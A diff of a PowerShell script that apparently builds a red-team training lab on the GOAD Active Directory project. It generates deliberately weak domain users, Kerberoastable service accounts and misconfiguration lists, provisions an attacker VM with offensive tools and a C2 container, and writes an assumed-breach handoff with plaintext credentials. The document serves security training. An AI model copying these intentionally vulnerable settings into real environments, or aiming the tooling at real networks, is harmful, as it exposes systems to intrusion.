+    def run_docker_ansible(self, ansible_playbook_command, path):
+        """Run Ansible inside the goadansible Docker container (Windows host)."""
+        goad_path = GoadPath.get_goad_path()
+        docker_cmd = [
+            'docker', 'run', '--rm',
+            '--network', 'host',
+            '-h', 'goadansible',
+            '-v', f'{goad_path}:/goad',
+            '-w', '/goad',
+            'goadansible',
+            'bash', '-c', ansible_playbook_command
+        ]
+        print(f"[*] Docker Ansible: {ansible_playbook_command}")
+        return self.run_cmd(docker_cmd)
+'@
+            $content = $content -replace "(class Windows\(Command\):.*?)((?=\nclass )|$)", "`$1`n$dockerMethod`n"
+            Set-Content -Path $winCmdFile -Value $content -Force
+            Write-Log "Patched windows.py (Docker Ansible method)" "SUCCESS"
+        }
+
+        # Fix is_in_path signature
+        if ($content -match "def is_in_path\(self, bin_file\):" -and $content -notmatch "def is_in_path\(self, bin_file, verbose") {
+            $content = Get-Content $winCmdFile -Raw
+            $content = $content -replace "def is_in_path\(self, bin_file\):", "def is_in_path(self, bin_file, verbose=True):"
+            Set-Content -Path $winCmdFile -Value $content -Force
+            Write-Log "Patched windows.py (is_in_path signature)" "SUCCESS"
         }
     }
 
-    Write-Log "Lab path: $labPath"
-
-    # ── Inject custom configuration into GOAD ──
-    $providerPath = Join-Path $labPath "providers" "vmware"
-    if (-not (Test-Path $providerPath)) {
-        $providerPath = Join-Path $labPath "providers" "virtualbox"
-        Write-Log "VMware provider not found in GOAD, adapting VirtualBox config..." "WARN"
-    }
-
-    # Modify Vagrantfile for our network
-    $vagrantFiles = Get-ChildItem -Path $labPath -Recurse -Filter "Vagrantfile" | Select-Object -First 1
-    if ($vagrantFiles) {
-        Write-Log "Customizing Vagrantfile with lab network settings..."
-        $vfContent = Get-Content $vagrantFiles.FullName -Raw
-
-        # Inject custom network — replace IP references
-        # GOAD typically uses 192.168.56.x by default
-        $defaultSubnet = "192.168.56"
-        $newSubnet = $NetInfo.Subnet
-
-        if ($newSubnet -ne $defaultSubnet) {
-            $vfContent = $vfContent -replace [regex]::Escape($defaultSubnet), $newSubnet
-            Write-Log "Replaced subnet $defaultSubnet -> $newSubnet"
+    # Patch 3: Docker provisioner for Windows
+    $dockerProvFile = Join-Path $GOAD_DIR "goad" "provisioner" "ansible" "docker.py"
+    if (Test-Path $dockerProvFile) {
+        $content = Get-Content $dockerProvFile -Raw
+        # Windows bypass for docker group check
+        if ($content -match "is_current_user_in_docker_group" -and $content -notmatch "os\.name\s*==\s*'nt'") {
+            $content = $content -replace "(def is_current_user_in_docker_group.*?:.*?\n)",
+                                          "`$1        if os.name == 'nt':`n            return True`n"
+            Set-Content -Path $dockerProvFile -Value $content -Force
+            Write-Log "Patched docker.py (Windows docker group bypass)" "SUCCESS"
         }
-
-        # Replace vmnet if present
-        $vfContent = $vfContent -replace "vmnet\d+", $VMnet
-
-        Set-Content -Path $vagrantFiles.FullName -Value $vfContent -Force
-        Write-Log "Vagrantfile customized." "SUCCESS"
+        # Replace grep-based docker image check with cross-platform version
+        if ($content -match "grep.*goadansible" -and $content -notmatch "docker.*images.*--format") {
+            $content = Get-Content $dockerProvFile -Raw
+            $content = $content -replace "subprocess\.run\(\[.*grep.*goadansible.*?\]",
+                                          "subprocess.run(['docker', 'images', '--format', '{{.Repository}}', 'goadansible']"
+            Set-Content -Path $dockerProvFile -Value $content -Force
+            Write-Log "Patched docker.py (cross-platform image check)" "SUCCESS"
+        }
     }
+}
 
-    # ── Inject custom AD users via Ansible variables ──
-    $ansiblePath = Join-Path $GOAD_DIR "ansible"
-    $customVarsDir = Join-Path $SCRIPT_DIR "custom-ansible-vars"
-    if (-not (Test-Path $customVarsDir)) { New-Item -ItemType Directory -Path $customVarsDir -Force | Out-Null }
+function New-GOADInjectionVars {
+    param(
+        [hashtable]$Config,
+        [hashtable]$NetInfo,
+        [array]$ADUsers,
+        [array]$ServiceAccounts,
+        [array]$Misconfigs
+    )
 
-    # Generate custom users YAML
-    $usersYaml = "---`n# Auto-generated by Insta-Internal-Labinator`n# Client: $($Config.clientName)`n# Domain: $($Config.domain)`n`ncustom_domain_users:`n"
-    foreach ($u in $ADUsers) {
-        $usersYaml += "  - name: `"$($u.Username)`"`n"
-        $usersYaml += "    password: `"$($u.Password)`"`n"
-        $usersYaml += "    firstname: `"$($u.FirstName)`"`n"
-        $usersYaml += "    lastname: `"$($u.LastName)`"`n"
-        $usersYaml += "    department: `"$($u.Department)`"`n"
-        $usersYaml += "    title: `"$($u.Title)`"`n"
-        $usersYaml += "    password_never_expires: $(if ($u.WeakPW) { 'true' } else { 'false' })`n"
-        $usersYaml += "`n"
-    }
-    Set-Content -Path (Join-Path $customVarsDir "custom_users.yml") -Value $usersYaml -Force
+    if (-not (Test-Path $CUSTOM_VARS_DIR)) { New-Item -ItemType Directory -Path $CUSTOM_VARS_DIR -Force | Out-Null }
 
-    # Generate service accounts YAML (Kerberoastable)
-    $svcYaml = "---`n# Kerberoastable service accounts`n`ncustom_service_accounts:`n"
-    foreach ($svc in $ServiceAccounts) {
-        $svcYaml += "  - name: `"$($svc.Name)`"`n"
-        $svcYaml += "    password: `"$($svc.Password)`"`n"
-        $svcYaml += "    spn: `"$($svc.SPN)`"`n"
-        $svcYaml += "    description: `"$($svc.Desc)`"`n`n"
-    }
-    Set-Content -Path (Join-Path $customVarsDir "custom_services.yml") -Value $svcYaml -Force
-
-    # Generate domain config override
     $domainParts = $Config.domain -split "\."
     $domainNetbios = $domainParts[0].ToUpper()
+
+    # Domain config
     $domainYaml = @"
 ---
-# Domain configuration override
+# Auto-generated by Insta-Internal-Labinator v$SCRIPT_VERSION
+# Client: $($Config.clientName)
+# Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+
 custom_domain:
   name: "$($Config.domain)"
   netbios: "$domainNetbios"
@@ -591,69 +1033,51 @@ custom_domain:
   initial_user: "$($Config.lowPrivUser.username)"
   initial_password: "$($Config.lowPrivUser.password)"
 "@
-    Set-Content -Path (Join-Path $customVarsDir "custom_domain.yml") -Value $domainYaml -Force
+    Set-Content -Path (Join-Path $CUSTOM_VARS_DIR "custom_domain.yml") -Value $domainYaml -Force
 
-    # Generate misconfigurations manifest
-    $misconfigYaml = "---`n# Active misconfigurations for this engagement`n`nactive_misconfigurations:`n"
+    # Users YAML
+    $usersYaml = "---`n# Domain users ($($ADUsers.Count) total)`ncustom_domain_users:`n"
+    foreach ($u in $ADUsers | Select-Object -First 50) {  # Limit to 50 for Ansible var file size
+        $usersYaml += "  - name: `"$($u.Username)`"`n"
+        $usersYaml += "    password: `"$($u.Password)`"`n"
+        $usersYaml += "    firstname: `"$($u.FirstName)`"`n"
+        $usersYaml += "    lastname: `"$($u.LastName)`"`n"
+        $usersYaml += "    department: `"$($u.Department)`"`n"
+        $usersYaml += "    title: `"$($u.Title)`"`n"
+    }
+    Set-Content -Path (Join-Path $CUSTOM_VARS_DIR "custom_users.yml") -Value $usersYaml -Force
+
+    # Service accounts
+    $svcYaml = "---`ncustom_service_accounts:`n"
+    foreach ($svc in $ServiceAccounts) {
+        $spn = $svc.SPN -replace "\{domain\}", $Config.domain
+        $svcYaml += "  - name: `"$($svc.Name)`"`n"
+        $svcYaml += "    password: `"$($svc.Password)`"`n"
+        $svcYaml += "    spn: `"$spn`"`n"
+        $svcYaml += "    description: `"$($svc.Desc)`"`n"
+        if ($svc.DelegationType -ne "none") {
+            $svcYaml += "    delegation: `"$($svc.DelegationType)`"`n"
+        }
+    }
+    Set-Content -Path (Join-Path $CUSTOM_VARS_DIR "custom_services.yml") -Value $svcYaml -Force
+
+    # Misconfigurations
+    $mcYaml = "---`nactive_misconfigurations:`n"
     foreach ($mc in $Misconfigs) {
-        $misconfigYaml += "  - id: `"$($mc.Id)`"`n"
-        $misconfigYaml += "    description: `"$($mc.Description)`"`n"
-        $misconfigYaml += "    enabled: true`n`n"
+        $mcYaml += "  - id: `"$($mc.Id)`"`n"
+        $mcYaml += "    category: `"$($mc.Category)`"`n"
+        $mcYaml += "    description: `"$($mc.Desc)`"`n"
+        $mcYaml += "    severity: `"$($mc.Severity)`"`n"
+        $mcYaml += "    enabled: true`n"
     }
-    Set-Content -Path (Join-Path $customVarsDir "custom_misconfigs.yml") -Value $misconfigYaml -Force
+    Set-Content -Path (Join-Path $CUSTOM_VARS_DIR "custom_misconfigs.yml") -Value $mcYaml -Force
 
-    Write-Log "Custom Ansible variables generated in $customVarsDir" "SUCCESS"
-
-    # ── Run Vagrant to provision GOAD VMs ──
-    Write-Log "Starting GOAD VM provisioning (this will take 30-60 minutes)..." "WARN"
-
-    Push-Location $providerPath
-    try {
-        # Check if VMs already exist
-        $vagrantStatus = & vagrant status 2>&1
-        if ($vagrantStatus -match "running") {
-            if (-not $Force) {
-                Write-Log "VMs already running. Use -Force to rebuild." "WARN"
-                return
-            }
-            Write-Log "Force flag set — destroying existing VMs..." "WARN"
-            & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
-        }
-
-        Write-Log "Running vagrant up..."
-        & vagrant up 2>&1 | ForEach-Object { Write-Log $_ }
-        if ($LASTEXITCODE -ne 0) {
-            Write-Log "Vagrant up completed with warnings (exit code: $LASTEXITCODE)" "WARN"
-        }
-        else {
-            Write-Log "GOAD VMs provisioned successfully!" "SUCCESS"
-        }
-    }
-    finally {
-        Pop-Location
-    }
-
-    # ── Run Ansible provisioning ──
-    Write-Log "Running Ansible provisioning for AD configuration..."
-
-    $ansibleInventory = Join-Path $providerPath "inventory"
-    if (Test-Path $ansibleInventory) {
-        # Set environment for custom vars
-        $env:GOAD_CUSTOM_VARS = $customVarsDir
-
-        # Look for provisioning script
-        $provisionScript = Join-Path $GOAD_DIR "scripts" "provisionning.sh"
-        if (-not (Test-Path $provisionScript)) {
-            $provisionScript = Join-Path $GOAD_DIR "ansible" "provisioning.sh"
-        }
-
-        Write-Log "Ansible provisioning should be run from a Linux/WSL environment." "WARN"
-        Write-Log "Custom variables are in: $customVarsDir" "INFO"
-        Write-Log "Copy these to GOAD ansible/group_vars/ to inject custom users." "INFO"
-    }
+    Write-Log "Injection vars written to $CUSTOM_VARS_DIR" "SUCCESS"
 }
 
-# ─── ATTACKER VM DEPLOYMENT ──────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# ATTACKER VM DEPLOYMENT
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Deploy-AttackerVM {
     param(
@@ -661,22 +1085,31 @@ function Deploy-AttackerVM {
         [hashtable]$NetInfo,
         [string]$VMnet
     )
-    Write-Banner "DEPLOYING ATTACKER VM"
+    Write-Banner "DEPLOYING ATTACKER VM" -Step 4 -Total 8
 
     $attackerDir = Join-Path $SCRIPT_DIR "attacker-vm"
     if (-not (Test-Path $attackerDir)) { New-Item -ItemType Directory -Path $attackerDir -Force | Out-Null }
 
     $attackerIP = $NetInfo.Attacker
-    $attackerRAM = $Config.attackerVm.ramMB
-    $attackerCPUs = $Config.attackerVm.cpus
+    $subnet = $NetInfo.Subnet
 
-    # Generate Vagrantfile for attacker VM
+    # Check if already running (idempotent)
+    if (Test-Path (Join-Path $attackerDir "Vagrantfile")) {
+        Push-Location $attackerDir
+        $status = & vagrant status 2>&1 | Out-String
+        Pop-Location
+        if ($status -match "running" -and -not $Force) {
+            Write-Log "Attacker VM already running. Use -Force to rebuild." "SUCCESS"
+            return
+        }
+    }
+
+    # Build C2 Docker block
     $c2EnvLines = ""
     foreach ($key in $Config.c2EnvVars.Keys) {
         $val = $Config.c2EnvVars[$key]
         $c2EnvLines += "      echo '$key=$val' >> /opt/c2/.env`n"
     }
-
     $c2DockerBlock = ""
     if ($Config.c2DockerImage) {
         $c2DockerBlock = @"
@@ -704,30 +1137,27 @@ $c2EnvLines
 "@
     }
 
+    $domainParts = $Config.domain -split "\."
+    $domainNetbios = $domainParts[0].ToUpper()
+
     $vagrantContent = @"
 # -*- mode: ruby -*-
-# Insta-Internal-Labinator — Attacker VM
-# Auto-generated on $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+# Insta-Internal-Labinator v$SCRIPT_VERSION — Attacker VM
+# Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 
 Vagrant.configure("2") do |config|
   config.vm.box = "bento/ubuntu-24.04"
   config.vm.hostname = "attacker"
-
-  # Host-only NIC — same network as GOAD lab
-  config.vm.network "private_network", ip: "$attackerIP", virtualbox__intnet: false
-
-  # NAT NIC for internet access (C2 callbacks, updates)
-  # Vagrant adds NAT adapter by default as adapter 1
+  config.vm.define "attacker-vm" do |attacker|
+  end
 
   config.vm.provider "vmware_desktop" do |v|
-    v.vmx["memsize"] = "$attackerRAM"
-    v.vmx["numvcpus"] = "$attackerCPUs"
+    v.vmx["memsize"] = "$($Config.attackerVm.ramMB)"
+    v.vmx["numvcpus"] = "$($Config.attackerVm.cpus)"
     v.vmx["displayName"] = "Attacker-VM-Labinator"
     v.vmx["ethernet1.present"] = "TRUE"
     v.vmx["ethernet1.connectionType"] = "custom"
     v.vmx["ethernet1.vnet"] = "$VMnet"
-    v.vmx["ethernet1.addressType"] = "static"
-    v.vmx["ethernet1.address"] = ""
     v.vmx["ethernet1.virtualDev"] = "e1000e"
   end
 
@@ -739,19 +1169,17 @@ Vagrant.configure("2") do |config|
     apt-get update -qq
     apt-get upgrade -y -qq
 
-    echo "[*] Installing core tools..."
+    echo "[*] Installing core packages..."
     apt-get install -y -qq \
       docker.io docker-compose-v2 \
       net-tools iputils-ping dnsutils \
-      nmap masscan crackmapexec \
+      nmap masscan \
       python3 python3-pip python3-venv \
       git curl wget jq unzip \
       smbclient ldap-utils \
-      bloodhound neo4j \
-      proxychains4 chisel \
+      proxychains4 \
       tmux vim htop
 
-    # Enable Docker
     systemctl enable docker
     systemctl start docker
     usermod -aG docker vagrant
@@ -764,7 +1192,6 @@ network:
     eth1:
       addresses:
         - $attackerIP/24
-      routes: []
       dhcp4: false
 NETPLAN
     netplan apply 2>/dev/null || true
@@ -772,21 +1199,14 @@ NETPLAN
     echo "[*] Installing Python pentesting tools..."
     python3 -m pip install --break-system-packages \
       impacket certipy-ad bloodhound ldapdomaindump \
-      pycryptodomex minikerberos 2>/dev/null || true
+      pycryptodomex minikerberos netexec 2>/dev/null || true
 
-    # Impacket from source for latest
     git clone --depth 1 https://github.com/fortra/impacket.git /opt/impacket 2>/dev/null || true
     cd /opt/impacket && python3 -m pip install --break-system-packages . 2>/dev/null || true
 
     echo "[*] Installing Kerbrute..."
-    KERBRUTE_URL="https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"
-    wget -q "\$KERBRUTE_URL" -O /usr/local/bin/kerbrute 2>/dev/null && chmod +x /usr/local/bin/kerbrute || true
-
-    echo "[*] Installing Ligolo-ng..."
-    LIGOLO_URL=\$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | jq -r '.assets[] | select(.name | contains("linux_amd64")) | select(.name | contains("agent")) | .browser_download_url' | head -1)
-    if [ -n "\$LIGOLO_URL" ]; then
-      wget -q "\$LIGOLO_URL" -O /usr/local/bin/ligolo-agent 2>/dev/null && chmod +x /usr/local/bin/ligolo-agent || true
-    fi
+    wget -q "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64" \
+      -O /usr/local/bin/kerbrute 2>/dev/null && chmod +x /usr/local/bin/kerbrute || true
 
     echo "[*] Setting up Responder..."
     git clone --depth 1 https://github.com/lgandx/Responder.git /opt/Responder 2>/dev/null || true
@@ -794,23 +1214,24 @@ NETPLAN
     echo "[*] Setting up enum4linux-ng..."
     git clone --depth 1 https://github.com/cddmp/enum4linux-ng.git /opt/enum4linux-ng 2>/dev/null || true
     cd /opt/enum4linux-ng && python3 -m pip install --break-system-packages -r requirements.txt 2>/dev/null || true
-
-    # NetExec (CrackMapExec successor)
-    python3 -m pip install --break-system-packages netexec 2>/dev/null || true
 $c2DockerBlock
 
     echo "[*] Creating engagement workspace..."
     mkdir -p /home/vagrant/engagement/{scans,loot,notes,bloodhound}
     chown -R vagrant:vagrant /home/vagrant/engagement
 
-    # Write lab info
     cat > /home/vagrant/engagement/lab-info.txt << 'LABINFO'
-=== Insta-Internal-Labinator ===
-Domain: $($Config.domain)
-Initial User: $($Config.lowPrivUser.username)
-Lab Network: $($Config.cidr)
-Attacker IP: $attackerIP
-Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+=== Insta-Internal-Labinator v$SCRIPT_VERSION ===
+Client:       $($Config.clientName)
+Domain:       $($Config.domain) ($domainNetbios)
+Initial User: $domainNetbios\\$($Config.lowPrivUser.username)
+Password:     $($Config.lowPrivUser.password)
+Lab Network:  $($Config.cidr)
+Attacker IP:  $attackerIP
+DC01:         $subnet.10
+DC02:         $subnet.11
+SRV02:        $subnet.22
+Generated:    $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 LABINFO
 
     echo "[+] Attacker VM provisioning complete!"
@@ -819,70 +1240,71 @@ end
 "@
 
     Set-Content -Path (Join-Path $attackerDir "Vagrantfile") -Value $vagrantContent -Force
-    Write-Log "Attacker VM Vagrantfile generated." "SUCCESS"
+    Write-Log "Vagrantfile generated." "SUCCESS"
 
-    # Provision attacker VM
     Push-Location $attackerDir
     try {
-        $vagrantStatus = & vagrant status 2>&1
-        if ($vagrantStatus -match "running") {
-            if (-not $Force) {
-                Write-Log "Attacker VM already running." "WARN"
-                return
-            }
-            & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
+        if ($Force) {
+            Write-Log "Force rebuild — destroying existing VM..." "WARN"
+            & vagrant destroy -f 2>&1 | Out-Null
         }
-
-        Write-Log "Starting Attacker VM (this will take 10-15 minutes)..."
-        & vagrant up 2>&1 | ForEach-Object { Write-Log $_ }
-        if ($LASTEXITCODE -ne 0) {
-            Write-Log "Attacker VM provisioning had warnings (exit code: $LASTEXITCODE)" "WARN"
-        }
-        else {
-            Write-Log "Attacker VM provisioned successfully!" "SUCCESS"
+        Write-Log "Starting Attacker VM (this takes 10-15 minutes)..." "STEP"
+        & vagrant up --provider vmware_desktop 2>&1 | ForEach-Object { Write-Log $_ "DETAIL" }
+        if ($LASTEXITCODE -eq 0) {
+            Write-Log "Attacker VM deployed at $attackerIP!" "SUCCESS"
+        } else {
+            Write-Log "Attacker VM had warnings (exit: $LASTEXITCODE)" "WARN"
         }
     }
-    finally {
-        Pop-Location
-    }
+    finally { Pop-Location }
 }
 
-# ─── SNAPSHOTS ───────────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# SNAPSHOTS
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function New-VMwareSnapshots {
     param([string]$Timestamp)
-    Write-Banner "CREATING VMWARE SNAPSHOTS"
+    Write-Banner "CREATING VMWARE SNAPSHOTS" -Step 5 -Total 8
 
     if (-not $script:VMRUN) {
-        Write-Log "vmrun not available — skipping snapshots." "WARN"
+        Write-Log "vmrun not available — skipping." "WARN"
         return
     }
 
     $snapshotName = "Fresh-Deploy-$Timestamp"
-
-    # Find all running VMs
     $runningVMs = & $script:VMRUN list 2>&1
     $vmxFiles = $runningVMs | Where-Object { $_ -match "\.vmx$" }
 
     if (-not $vmxFiles) {
-        Write-Log "No running VMs found for snapshotting." "WARN"
+        Write-Log "No running VMs found." "WARN"
         return
     }
 
+    $total = @($vmxFiles).Count
+    $i = 0
     foreach ($vmx in $vmxFiles) {
-        $vmName = [System.IO.Path]::GetFileNameWithoutExtension($vmx)
-        Write-Log "Snapshotting $vmName -> $snapshotName"
-        & $script:VMRUN snapshot "$vmx" "$snapshotName" 2>&1 | ForEach-Object { Write-Log $_ }
-        if ($LASTEXITCODE -eq 0) {
-            Write-Log "Snapshot created: $vmName" "SUCCESS"
+        $i++
+        $vmName = [System.IO.Path]::GetFileNameWithoutExtension(
+            [System.IO.Path]::GetDirectoryName(
+                [System.IO.Path]::GetDirectoryName($vmx)
+            )
+        )
+        if ($vmName -eq "vmware_desktop") {
+            # Extract from parent path
+            $parts = $vmx -split "\\" | Where-Object { $_ -match "GOAD-Light|attacker" }
+            $vmName = if ($parts) { $parts[0] } else { "VM-$i" }
         }
-        else {
-            Write-Log "Snapshot failed for $vmName" "WARN"
-        }
+        Write-Log "[$i/$total] Snapshotting $vmName..." "STEP"
+        & $script:VMRUN snapshot "$vmx" "$snapshotName" 2>&1 | Out-Null
+        if ($LASTEXITCODE -eq 0) { Write-Log "Snapshot: $vmName → $snapshotName" "SUCCESS" }
+        else { Write-Log "Snapshot failed for $vmName" "WARN" }
     }
 }
 
-# ─── HANDOFF PACKAGE GENERATION ──────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# HANDOFF PACKAGE (v3.0 — executive quality)
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function New-HandoffPackage {
     param(
@@ -894,7 +1316,7 @@ function New-HandoffPackage {
         [array]$Misconfigs,
         [string]$Timestamp
     )
-    Write-Banner "GENERATING RED TEAM HANDOFF PACKAGE"
+    Write-Banner "GENERATING RED TEAM HANDOFF PACKAGE" -Step 6 -Total 8
 
     $domainClean = $Config.domain -replace "\.", "-"
     $handoffDir = Join-Path $SCRIPT_DIR "RedTeam-Handoff-${domainClean}-${Timestamp}"
@@ -902,432 +1324,489 @@ function New-HandoffPackage {
 
     $domainParts = $Config.domain -split "\."
     $domainNetbios = $domainParts[0].ToUpper()
-    $dcIP1 = "$($NetInfo.Subnet).10"
-    $dcIP2 = "$($NetInfo.Subnet).11"
-    $srvIP  = "$($NetInfo.Subnet).22"
+    $dcIP1 = $NetInfo.DC1
+    $dcIP2 = $NetInfo.DC2
+    $srvIP = $NetInfo.SRV02
     $attackerIP = $NetInfo.Attacker
+    $engId = "RT-$(Get-Date -Format 'yyyyMMdd')-$(Get-SeededRandom -Min 1000 -Max 9999)"
+    $emailDomain = $Config.domain -replace '\.(local|internal|corp|lan|ad|intra)$', '.com'
+    $phone1 = "+1 (555) $(Get-SeededRandom -Min 100 -Max 999)-$(Get-SeededRandom -Min 1000 -Max 9999)"
+    $phone2 = "+1 (555) $(Get-SeededRandom -Min 100 -Max 999)-$(Get-SeededRandom -Min 1000 -Max 9999)"
 
-    # ── Handoff.md ──
+    # ────── Handoff.md ──────
     $handoffMd = @"
 # RED TEAM ENGAGEMENT — ASSUMED BREACH HANDOFF
 
 **Classification: CONFIDENTIAL — Authorized Personnel Only**
 **Client: $($Config.clientName)**
 **Date: $(Get-Date -Format 'MMMM dd, yyyy')**
-**Engagement ID: RT-$(Get-Date -Format 'yyyyMMdd')-$(Get-Random -Minimum 1000 -Maximum 9999)**
+**Engagement ID: $engId**
 
 ---
 
-## 1. ENGAGEMENT OVERVIEW
+## 1. EXECUTIVE SUMMARY
 
-$($Config.clientName) has engaged your team to conduct an **internal assumed-breach penetration test** of our Active Directory environment. This document provides the necessary information to begin testing.
+$($Config.clientName) has contracted an **internal assumed-breach penetration test** to evaluate the security posture of its Active Directory environment. The testing team has been provided low-privileged domain credentials simulating a compromised employee account (e.g., via phishing). The objective is to identify privilege escalation paths, lateral movement opportunities, and demonstrate the potential impact of a real attacker gaining initial foothold within the corporate network.
 
-**Type:** Internal Network Penetration Test — Assumed Breach
-**Methodology:** PTES / MITRE ATT&CK
-**Duration:** 5 business days (Mon–Fri, 09:00–17:00 local)
-**Authorization:** Full authorization for testing within defined scope
+**Engagement Type:** Internal Network Penetration Test — Assumed Breach
+**Methodology:** PTES (Penetration Testing Execution Standard) / MITRE ATT&CK
+**Authorized Duration:** 5 business days (Mon–Fri, 09:00–17:00 local)
+**Authorization Level:** Full authorization for all testing within defined scope
+
+---
 
 ## 2. RULES OF ENGAGEMENT
 
-- **In-Scope:** All systems within the defined CIDR range(s)
-- **Out-of-Scope:** Internet-facing assets, production databases (destructive operations)
-- **Restrictions:**
-  - No denial-of-service attacks
-  - No physical access testing
-  - No social engineering (unless separately authorized)
-  - Stop and notify if PHI/PII is discovered (do not exfiltrate)
-- **Emergency Contact:** IT Security Team — security@$($Config.domain -replace '\.local|\.internal|\.corp|\.lan|\.ad', '.com')
-- **Phone:** +1 (555) $(Get-Random -Minimum 100 -Maximum 999)-$(Get-Random -Minimum 1000 -Maximum 9999)
+### 2.1 Authorized Activities
+- Network reconnaissance and enumeration
+- Active Directory enumeration and exploitation
+- Credential harvesting and password attacks (offline cracking)
+- Lateral movement and privilege escalation
+- Kerberos-based attacks (Kerberoasting, AS-REP, delegation abuse)
+- ADCS certificate-based attacks
+- SMB/NTLM relay attacks
+- Simulated data exfiltration (identify, do not extract)
 
-## 3. SCOPE
+### 2.2 Restrictions
+| Restriction | Detail |
+|-------------|--------|
+| **Denial of Service** | No intentional disruption of services |
+| **Physical Access** | Physical testing is not authorized |
+| **Social Engineering** | Not authorized unless separately approved |
+| **Data Handling** | If PHI/PII is discovered, stop and notify immediately |
+| **Destructive Actions** | No deletion of data, accounts, or configurations |
+| **Scope Boundaries** | Stay within defined CIDR range(s) |
 
-### Network Ranges
-| CIDR | Description |
-|------|-------------|
-| $($Config.cidr) | Primary corporate LAN — AD, servers, workstations |
+### 2.3 Emergency Contacts
+| Role | Contact | Phone |
+|------|---------|-------|
+| **IT Security** | security@$emailDomain | $phone1 |
+| **CISO Office** | ciso@$emailDomain | $phone2 |
 
-### Domain Information
+**Emergency Protocol:** If testing causes unintended impact, immediately stop all activities and contact the numbers above.
+
+---
+
+## 3. IN-SCOPE DEFINITION
+
+### 3.1 Network Ranges
+| CIDR | Description | Classification |
+|------|-------------|----------------|
+| ``$($Config.cidr)`` | Primary corporate LAN — AD infrastructure, servers | **In-Scope** |
+
+### 3.2 Domain Information
 | Field | Value |
 |-------|-------|
-| **Domain** | $($Config.domain) |
-| **NetBIOS** | $domainNetbios |
-| **Domain Controllers** | DC01 ($dcIP1), DC02 ($dcIP2) |
-| **Functional Level** | Windows Server 2019 |
+| **Domain FQDN** | ``$($Config.domain)`` |
+| **NetBIOS Name** | ``$domainNetbios`` |
+| **Functional Level** | Windows Server 2016/2019 |
 
-## 4. ASSUMED BREACH — INITIAL ACCESS
+### 3.3 Target Systems
+| Hostname | IP Address | OS | Roles | Classification |
+|----------|------------|-----|-------|---------------|
+| DC01 | ``$dcIP1`` | Windows Server 2019 | AD DS (PDC), DNS, ADCS | In-Scope |
+| DC02 | ``$dcIP2`` | Windows Server 2019 | AD DS (BDC), DNS | In-Scope |
+| SRV02 | ``$srvIP`` | Windows Server 2019 | File Server, MSSQL, IIS | In-Scope |
 
-You have been provided a **low-privileged domain account** simulating a compromised employee credential (e.g., phishing, credential stuffing, or an insider threat scenario).
+---
+
+## 4. INITIAL FOOTHOLD — ASSUMED BREACH CREDENTIALS
+
+The following credentials simulate a compromised employee account, as would be obtained through a successful phishing attack or credential stuffing:
 
 | Field | Value |
 |-------|-------|
 | **Username** | ``$domainNetbios\$($Config.lowPrivUser.username)`` |
 | **Password** | ``$($Config.lowPrivUser.password)`` |
-| **Account Type** | Standard domain user |
-| **Description** | Regular employee account with default group memberships |
+| **Account Type** | Standard domain user (Domain Users group) |
+| **Access Level** | Low-privileged — no administrative rights |
 
-> **Objective:** Escalate from this low-privileged account to **Domain Admin** or equivalent enterprise admin access. Document the full attack path.
+> **Primary Objective:** Starting from this account, escalate privileges to **Domain Admin** or **Enterprise Admin**. Document the complete attack chain including every credential, pivot, and technique used.
 
-## 5. KNOWN NETWORK INFORMATION
-
-The following has been shared as part of the assumed-breach scenario (simulating information an insider or compromised workstation would have access to):
-
-- File shares are accessible at ``\\$dcIP1\`` and ``\\$srvIP\``
-- The IT department uses a shared ``\\$srvIP\IT-Share$`` for scripts and tools
-- DNS is served by the domain controllers
-- WSUS is hosted internally (potential for lateral movement)
-- Several legacy service accounts are known to exist
-
-## 6. POINTS OF CONTACT
-
-| Role | Name | Contact |
-|------|------|---------|
-| **Engagement Lead** | [Your Name] | engagement-lead@client.com |
-| **IT Security** | Security Operations | security@$($Config.domain -replace '\.local|\.internal|\.corp|\.lan|\.ad', '.com') |
-| **Emergency** | CISO Office | +1 (555) $(Get-Random -Minimum 100 -Maximum 999)-$(Get-Random -Minimum 1000 -Maximum 9999) |
-
-## 7. DELIVERABLE EXPECTATIONS
-
-- Executive Summary
-- Technical Findings (CVSS-scored)
-- Full Attack Narrative with screenshots
-- Remediation Recommendations
-- BloodHound data / attack path diagrams
+> **Secondary Objectives:**
+> - Map all viable privilege escalation paths
+> - Identify and exploit AD Certificate Services misconfigurations
+> - Demonstrate credential harvesting capabilities
+> - Identify sensitive data exposure on network shares
+> - Document all Kerberoastable/AS-REP roastable accounts
 
 ---
 
-*This document is the property of $($Config.clientName) and is provided under NDA.*
+## 5. KNOWN NETWORK INTELLIGENCE
+
+The following information has been shared as part of the assumed-breach scenario, representing knowledge a compromised employee would reasonably possess:
+
+- **DNS:** Served by the domain controllers ($dcIP1, $dcIP2)
+- **File Shares:** Corporate shares accessible at ``\\$srvIP\``
+- **Intranet:** Internal web applications hosted on SRV02 (IIS)
+- **Database:** SQL Server running on SRV02 (default instance, port 1433)
+- **ADCS:** Certificate Services deployed for PKI operations
+- **Naming Convention:** User accounts follow ``firstname.lastname`` pattern
+- **IT Practices:** IT staff maintain scripts and documentation on shared drives
+- **Legacy Systems:** Several service accounts exist from decommissioned applications
+
+---
+
+## 6. SAMPLE "LEAKED" INTELLIGENCE
+
+During OSINT reconnaissance, the following was discovered (simulated):
+
+- An employee posted their VPN configuration on a public GitHub gist (redacted)
+- LinkedIn profiles reveal IT team uses ``$domainNetbios\`` naming convention
+- A former employee's portfolio mentions "Windows Server 2019" infrastructure
+- Job postings reference "Active Directory," "SCCM," and "Azure AD Connect"
+- ``$emailDomain`` SPF record indicates on-premise Exchange
+
+---
+
